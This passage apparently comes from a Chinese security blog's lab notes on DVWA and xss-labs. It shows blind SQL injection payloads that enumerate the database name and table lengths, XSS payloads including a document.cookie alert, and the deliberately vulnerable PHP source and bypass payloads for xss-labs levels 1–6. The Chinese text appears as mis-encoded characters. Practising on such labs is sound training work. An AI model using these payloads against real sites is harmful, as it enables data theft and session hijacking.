<li>ç»“è®ºï¼šåˆ¤æ–­è¯¥ç±»å‹ä¸ºå­—ç¬¦å‹ï¼Œä¸”ä¸ºå•å¼•å·æ³¨å…¥ã€‚<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())%3E5%20--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4fc5890ec7499c979c43bc0a66361e~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20length(database())=4%20--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>

<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/58f342a8754d473fb105e2ace573f080~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<ul>
<li>è¯´æ˜æ•°æ®åº“é•¿åº¦ä¸º4</li>
</ul>
<table>
<thead>
<tr>
<th>è¾“å…¥è¯­å¥</th>
<th>æ˜¾ç¤ºç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td>1â€™ and ascii(substr(database(),1,1))&gt;97#</td>
<td>æ˜¾ç¤ºå­˜åœ¨ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªå°å†™å­—æ¯ä¸”ä¸æ˜¯aã€‚</td>
</tr>
<tr>
<td>1â€™ and ascii(substr(database(),1,1))&#x3D;100#</td>
<td>æ˜¾ç¤ºå­˜åœ¨ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªæ˜¯d</td>
</tr>
<tr>
<td>1â€™ and ascii(substr(database(),2,1))&#x3D;118#</td>
<td>æ˜¾ç¤ºå­˜åœ¨ï¼Œè¯´æ˜ç¬¬äºŒä¸ªæ˜¯v</td>
</tr>
<tr>
<td>1â€™ and ascii(substr(database(),3,1))&#x3D;119#</td>
<td>æ˜¾ç¤ºå­˜åœ¨ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªæ˜¯w</td>
</tr>
<tr>
<td>1â€™ and ascii(substr(database(),4,1))&#x3D;97#</td>
<td>æ˜¾ç¤ºå­˜åœ¨ï¼Œè¯´æ˜ç¬¬å››ä¸ªæ˜¯a</td>
</tr>
</tbody></table>
<ul>
<li><p>æ•°æ®åº“åç§°ä¸º:dvwa</p>
</li>
<li><p>å¯¹è¡¨çš„é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼š</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>è¾“å…¥è¯­å¥</th>
<th>æ˜¾ç¤ºç»“æœ</th>
</tr>
</thead>
<tbody><tr>
<td>1â€™ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;10#</td>
<td>ä¸å­˜åœ¨</td>
</tr>
<tr>
<td>1â€™ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;8#</td>
<td>å­˜åœ¨ï¼Œè¯´æ˜dvwaç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸º9</td>
</tr>
<tr>
<td>1â€™ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;9#</td>
<td>å­˜åœ¨ï¼ŒéªŒè¯æˆåŠŸ</td>
</tr>
<tr>
<td>åŒç†å¯ä»¥å¯¹ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦è¿›è¡ŒçŒœæµ‹ï¼š</td>
<td></td>
</tr>
<tr>
<td>1â€™ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;5#</td>
<td>å­˜åœ¨ï¼Œdvwaç¬¬äºŒä¸ªè¡¨é•¿åº¦ä¸º5</td>
</tr>
</tbody></table>
<ul>
<li>å“ï¼åæ­£å°±æ˜¯ä¸åœçš„å»å°è¯•ï¼Œæ–¹æ³•å¦‚ä¸Šæ‰€ç¤ºã€‚åœ¨æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ä¸­å®Œæ•´å†™åˆ°è¿‡ç›²æ³¨å…¨è¿‡ç¨‹ <a href="https://juejin.cn/post/7089314737309089828#heading-12">ç‚¹å‡»è·³è½¬</a></li>
</ul>
<h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0ad95fc241f04b67be5ba7b6bfe06c73~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52c120a0576743d4970b7ec6abb65870~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure>
<ul>
<li>æ‡µäº†å•Šï¼Œå•¥è¿‡æ»¤éƒ½æ²¡æœ‰</li>
</ul>
<h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h1><ul>
<li><p>å“ï¼ä¹Ÿæ˜¯å•¥è¿‡æ»¤éƒ½æ²¡æœ‰<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2fc6777f0a57411ea173b0a9dd69541f~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7c94119438b46f1842b02b417c2881a~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
</li>
<li><p>é‚£ä¹ˆè¿™ä¸ªå­˜å‚¨å‹xssï¼Œå®ƒä¸ä¼šéšç€é¡µé¢é‡æ–°åŠ è½½jsäº‹ä»¶è€Œæ”¹å˜ï¼Œå…¶å­˜å‚¨åœ¨æ•°æ®åº“ï¼Œä¸‹ä¸€æ¬¡åˆ·æ–°é¡µé¢åä¾æ—§ä¼šæ‰§è¡Œè¯¥jsè¯­å¥ã€‚</p>
</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs-masteré¶åœºç¬”è®°</title>
    <url>/2022/10/01/xss-labs-master%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h1><ul>
<li>åœ¨çº¿åœ°å€ï¼š<a href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></li>
<li>phpstudyæ­å»º</li>
</ul>
<h1 id="level1ï¼š"><a href="#level1ï¼š" class="headerlink" title="level1ï¼š"></a>level1ï¼š</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;name&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>é€šè¿‡PHPçš„GETæ–¹å¼ä¼ å‚ï¼Œæ‰“å°è¾“å‡º</li>
</ul>
<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">.&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span>.</span><br></pre></td></tr></table></figure>


<p>â€‹<br>â€‹<br>â€‹                </p>
<h1 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;	</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level3.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>é—­åˆå¼¹çª—<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&#x27; //</span></span><br><span class="line"><span class="string">&#x27;</span>&gt; onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level4<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level4.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&#x27;alert(1)&#x27; //</span></span><br></pre></td></tr></table></figure>

<h1 id="level5"><a href="#level5" class="headerlink" title="level5:"></a>level5:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="meta">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="meta">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level5.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot;&gt; //</span></span><br></pre></td></tr></table></figure>

<h1 id="level6"><a href="#level6" class="headerlink" title="level6:"></a>level6:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level6<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level6<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = $_GET[&quot;keyword&quot;];</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span></span><br><span class="line"><span class="meta">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;h2 